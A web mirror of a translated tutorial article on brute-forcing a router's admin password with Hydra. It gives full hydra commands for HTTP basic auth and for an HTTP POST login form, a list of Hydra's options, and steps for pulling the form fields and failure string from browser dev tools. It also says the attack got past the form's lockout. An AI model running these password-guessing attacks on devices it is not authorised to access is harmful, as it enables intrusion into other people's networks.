<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Breaking the admin panel of the router</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="* There could be a warning that you do not need to use this program for criminal purposes, but hydra writes this before each hacking session * 



 In...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Breaking the admin panel of the router</h1><div class="post__text post__text-html js-mediator-article">  * There could be a warning that you do not need to use this program for criminal purposes, but hydra writes this before each hacking session * <br><br><img src="https://habrastorage.org/getpro/habr/post_images/55a/c84/8c0/55ac848c09846d1c43521705ad0d58e1.jpg" alt="image"><br><br>  In general, I decided to rummage through the settings of the router according to my needs, I drive in a familiar address for everyone, and then they ask for the password.  How to be?  Well, I began to sort out passwords, and their number is too large to sort through and too small to reset. <br><a name="habracut"></a><br>  And I opened google.  After a couple of requests, I found out about such a thing as hydra.  And then it began: the thirst for discovery, the search for the unknown, and so on. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h3>  Let's get started </h3><br>  The first thing I did was compile a password dictionary, neither more nor less, as many as 25 combinations.  Next, download either Kali linux, or Hydra itself (if <s>you are a</s> Linux <s>penguin</s> ).  Now we have two options (well, like two, I found information on two options). <br><br>  Either you have this dialog box: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d9e/f36/358/d9ef36358993d72ff00c84321d552918.jpg" alt="image"><br><br>  Or login and password requests form on the site.  My first option, so let's start with it.  On our way to the "admin" is the guardian in the form of a dialog box.  This is a type of <b>http-get</b> authorization <b>.</b> <br><br>  We open the terminal.  Enter: <br><br><pre><code class="bash hljs">hydra -l admin -P myPass.txt -s 80 192.168.1.1 http-get /</code> </pre> <br>  Where after ‚Äú-l‚Äù is login, after ‚Äú-P‚Äù dictionary, after ‚Äú-s‚Äù port.  We also have other flags at our disposal: <br><br><blockquote>  -R restore previous interrupted / aborted session <br><br>  -S perform SSL connection <br><br>  -s PORT if the service is not on the default port, then you can set the port here <br><br>  -l LOGIN or -L FILE with LOGINS (names), or download several logins from FILE <br><br>  -p PASSWORD or -P FILE with passwords for brute force, or download multiple passwords from FILE <br><br>  -x MINIMUM: MAXIMUM: SET OF SYMBOLS password generation for brute force, type "-x -h" for help <br><br>  -e nsr "n" - try with empty password, "s" - login as password and / or "r" - reverse credentials <br><br>  -u to focus on the user, not on the password (effectively! implied using the -x option) <br><br>  -C FILE format where "login: password" is separated by colons, instead of the -L / -P option <br><br>  -M FILE server list for attacks, one entry per line, after the colon ':' you can set the port <br><br>  -o FILE write the login / password pairs found in FILE instead of the standard output <br><br>  -f / -F exit when the login / password pair is matched (-M: -f for the host, -F globally) <br><br>  -t TASKS number of running TASKS in parallel (per host, default: 16) <br><br>  -w / -W TIME response timeout (32 seconds) / between connections per stream <br>  -4 / -6 prefer IPv4 (default) or IPv6 addresses <br><br>  -v / -V / -d verbal mode / show login + password for each attempt / debug mode <br><br>  -q do not print connection error messages <br><br>  -U module usage details <br>  server target: DNS, IP or 192.168.0.0/24 (this OR option -M) <br>  service service for hacking (see list of supported protocols) <br>  OPT some service modules support additional input (-U for module reference) </blockquote><br>  Well, something like this: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/b47/f27/1cf/b47f271cf19710fa1675617163e94a6c.jpg" alt="image"><br><br>  The second option: <br><br>  Not mine, honestly taken from Antimat, with the correction of the grammatical errors of the author (I left an abundance of punctuation marks).  Interestingly, can this be considered a translation? <br><br>  We are met by the form on the site: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/887/f3e/b81/887f3eb813f31a4e01412f048900badf.jpg" alt="image"></div><br>  This authorization method is <b>http-post-form</b> , and here you need to tinker a bit, because we need to understand how the browser sends data to the router. <br><br>  In this case, I used the Chrome browser (its analog Chromium in Kali Linux, is installed via apt-get install chromium). <br><br>  Now you need to do one very stupid thing ... specify the wrong username and pass ... <br>  why see later ... <br><br>  Press F12 to switch to the web page editing mode. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/a6f/fcc/00f/a6ffcc00fd5fce2a9290b23900a3ddec.jpg" alt="image"></div><br>  Go to Network ‚Üí Turn on <b>Preserv log</b> . <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/a6f/fcc/00f/a6ffcc00fd5fce2a9290b23900a3ddec.jpg" alt="image"></div><br>  Entering a false username and password ... <br><br><img src="https://habrastorage.org/getpro/habr/post_images/404/4f7/16d/4044f716d5296560fa1ebf694dc2ab13.jpg" alt="image"><br><br>  So what's up?  Will not work!  Moreover, after several failed login attempts, the form is blocked for 180 seconds. <br><br>  Go to the <b>HEADERS</b> tab and look for the line: <br><br><pre> <code class="hljs objectivec"> Request URL:http:<span class="hljs-comment"><span class="hljs-comment">//192.168.0.1/index.cgi</span></span></code> </pre> <br>  We cut everything off to the ip-address - /index.cgi ... Congratulations, we found the first part of the authorization script ... Go ahead ... Go to the <b>FORM DATA</b> tab and change the display mode to <b>VIEV SOURCE</b> . <br><br><img src="https://habrastorage.org/getpro/habr/post_images/66f/f6a/b1e/66ff6ab1ef33f1eabc0a47ff20d9f5e9.jpg" alt="image"><br><br><img src="https://habrastorage.org/getpro/habr/post_images/7fd/813/58d/7fd81358de891284713572cb19d0038b.jpg" alt="image"><br><br><pre> <code class="hljs pgsql">update_login=<span class="hljs-keyword"><span class="hljs-keyword">login</span></span>&amp;update_password=<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>&amp;check_auth=y&amp;tokenget=<span class="hljs-number"><span class="hljs-number">1300</span></span>&amp; update_login=<span class="hljs-keyword"><span class="hljs-keyword">login</span></span>&amp;update_password=<span class="hljs-keyword"><span class="hljs-keyword">password</span></span></code> </pre> <br>  Bingo!  We found the second part of the authorization script!  A little bit more!  Now you need to find a page with an error message ... You need to click on the tab ELEMENTS. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/7fd/813/58d/7fd81358de891284713572cb19d0038b.jpg" alt="image"></div><br>  And select the HTML code element (CTRL + SHIFT + C) and select the window with the error message ... in this case - Authentication failed! <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/b06/a75/4fa/b06a754faea1aba51640b4c258c6cb8b.jpg" alt="image"></div><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">span</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">langkey</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"bad_auth"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">style</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"display: inline;"</span></span></span><span class="hljs-tag">&gt;</span></span>Authentication failed!<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">span</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  Choose: <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">span</span></span> langkey=<span class="hljs-string"><span class="hljs-string">"bad_auth"</span></span></code> </pre> <br>  and rule a little ... bad_auth is everything!  The key is practically in our pocket ... Now we can completely write the authorization string: <br><br><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">index</span></span>.cgi:update_login=<span class="hljs-keyword"><span class="hljs-keyword">login</span></span>&amp;update_password=<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>:bad_auth</code> </pre> <br>  Now it is necessary to substitute instead of ‚Äúlogin‚Äù - ^ USER ^ and instead of ‚Äúpassword‚Äù ^ PASS ^ and then the line will look like: <br><br><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">index</span></span>.cgi:update_login=^<span class="hljs-keyword"><span class="hljs-keyword">USER</span></span>^&amp;update_password=^PASS^:bad_auth</code> </pre> <br>  Enter the command: <br><br><pre> <code class="bash hljs">hydra -l admin -P router-pass.dic -t 1 -e nsr -vV -f -s 80 192.168.0.1 http-post-form <span class="hljs-string"><span class="hljs-string">"/index.cgi:update_login=^USER^&amp;update_password=^PASS^:bad_auth"</span></span></code> </pre> <br>  Note that between parts of the script is a colon!  it is necessary!  By the way, the blocking of the form through the hydra did not occur ... This is very good. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/4df/464/45c/4df46445c1d7ea5c760b2613196ca120.jpg" alt="image"></div><br>  I don‚Äôt make sure of the performance of the second method, since I don‚Äôt have a suitable router model.  We'll have to trust the expressive person with Antimat. <br><br>  If anyone is interested, please, check and write in the comments.  I worked with the TL-WR1043N / TL-WR1043ND router.  <a href="https://forum.antichat.ru/threads/436408/">Anti</a> -router router - D-link300NRU. <br><br>  Thanks for attention! </div><p>Source: <a href="https://habr.com/ru/post/317306/">https://habr.com/ru/post/317306/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../317296/index.html">Technical interview at Google for Software Engineer - my experience</a></li>
<li><a href="../317298/index.html">Tuning Swift compiler. Part 2</a></li>
<li><a href="../317300/index.html">In C ++ 17, there are still no normal multidimensional arrays that have been in Fortran since Fortran 90</a></li>
<li><a href="../317302/index.html">List of material classes Material Design Lite</a></li>
<li><a href="../317304/index.html">Classic parser combinators in Python</a></li>
<li><a href="../317312/index.html">The perfect programmer. Part 1</a></li>
<li><a href="../317314/index.html">Progress Tracking in R</a></li>
<li><a href="../317318/index.html">Creating a website as a product or "why is it so expensive?"</a></li>
<li><a href="../317320/index.html">The study of connectivity in the brain based on electrophysiological data. Lecture in Yandex</a></li>
<li><a href="../317322/index.html">Pentest at Global Data Security - passing the 10th Pentestit Lab</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>